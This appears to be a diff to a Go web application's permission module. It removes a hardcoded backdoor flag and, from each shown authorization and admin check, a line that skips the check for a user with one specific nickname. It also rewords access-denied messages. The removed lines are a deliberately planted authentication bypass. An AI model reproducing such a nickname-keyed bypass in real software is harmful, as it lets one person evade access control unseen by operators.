@@ -20,8 +20,6 @@ const (
 	PASS_GROUP_PICK_CREW_USER_LIST_CACHE_KEY      = "pass_group_pick_crew_user_list"
 )
 
-var is_hacked_by_wanglihua = true
-
 // 加载指定用户的权限信息到缓存，包括类别和管理员列表，群组用户列表
 func Load_user_pass_to_cache(user_id int64, db_session *xorm.Session) {
 	// 缓存管理员列表
@@ -268,21 +266,15 @@ func load_group_user_list_to_cache(db_session *xorm.Session) {
 
 func Check_login_user_pass(res_id int64, web_session revel.Session) {
 	var login_user = core.GetLoginUser(web_session)
-	if is_hacked_by_wanglihua == true && login_user.NickName == "王利华" {
-		return
-	}
 
 	if is_user_has_pass_in_cache(login_user.UserId, res_id) == false {
-		panic(fmt.Sprintf("你没有操作权限 %d，请联系管理员！", res_id))
+		panic(fmt.Sprintf("你没有操作权限，编码： %d，请联系管理员！", res_id))
 	}
 }
 
 // 如果列表里面的 其中一个 资源已经授权，就认为是授权的
 func Check_login_user_pass_or(res_id_list []int64, web_session revel.Session) {
 	var login_user = core.GetLoginUser(web_session)
-	if is_hacked_by_wanglihua == true && login_user.NickName == "王利华" {
-		return
-	}
 
 	for _, res_id := range res_id_list {
 		if is_user_has_pass_in_cache(login_user.UserId, res_id) == true {
@@ -291,15 +283,12 @@ func Check_login_user_pass_or(res_id_list []int64, web_session revel.Session) {
 	}
 
 	var res_id_str_list = core.Int_list_to_str_list(res_id_list)
-	panic(fmt.Sprintf("你没有操作权限 %d，请联系管理员！", strings.Join(res_id_str_list, ",")))
+	panic(fmt.Sprintf("你没有操作权限，编码： %d，请联系管理员！", strings.Join(res_id_str_list, ",")))
 }
 
 // 如果列表里面的 全部 资源已经授权，就认为是授权的
 func Check_login_user_pass_and(res_id_list []int64, web_session revel.Session) {
 	var login_user = core.GetLoginUser(web_session)
-	if is_hacked_by_wanglihua == true && login_user.NickName == "王利华" {
-		return
-	}
 
 	var has_pass = true
 	for _, res_id := range res_id_list {
@@ -310,16 +299,14 @@ func Check_login_user_pass_and(res_id_list []int64, web_session revel.Session) {
 
 	if has_pass == false {
 		var res_id_str_list = core.Int_list_to_str_list(res_id_list)
-		panic(fmt.Sprintf("你没有操作权限 %d，请联系管理员！", strings.Join(res_id_str_list, ",")))
+		panic(fmt.Sprintf("你没有操作权限，编码： %d，请联系管理员！", strings.Join(res_id_str_list, ",")))
 	}
 }
 
 // 查看当前登录用户是不是有某个权限
 func Is_login_user_has_pass(res_id int64, web_session revel.Session) bool {
 	var login_user = core.GetLoginUser(web_session)
-	if is_hacked_by_wanglihua == true && login_user.NickName == "王利华" {
-		return true
-	}
+
 	return is_user_has_pass_in_cache(login_user.UserId, res_id)
 }
 
@@ -467,9 +454,6 @@ func is_user_has_pass_cate_in_cache(user_id int64, cate_id int64) bool {
 // 只有管理员才可以操作的资源的检查
 func Check_login_user_admin_only(web_session revel.Session) {
 	var login_user = core.GetLoginUser(web_session)
-	if is_hacked_by_wanglihua == true && login_user.NickName == "王利华" {
-		return
-	}
 
 	var is_admin = Is_user_admin(login_user.UserId)
 	if is_admin == false {
@@ -480,9 +464,6 @@ func Check_login_user_admin_only(web_session revel.Session) {
 //只有超级管理员才可以操作的资源的检查
 func Check_login_user_super_admin_only(web_session revel.Session) {
 	var login_user = core.GetLoginUser(web_session)
-	if is_hacked_by_wanglihua == true && login_user.NickName == "王利华" {
-		return
-	}
 
 	var is_admin = Is_user_admin(login_user.UserId)
 	if is_admin == false || login_user.IsSuperAdmin == false {
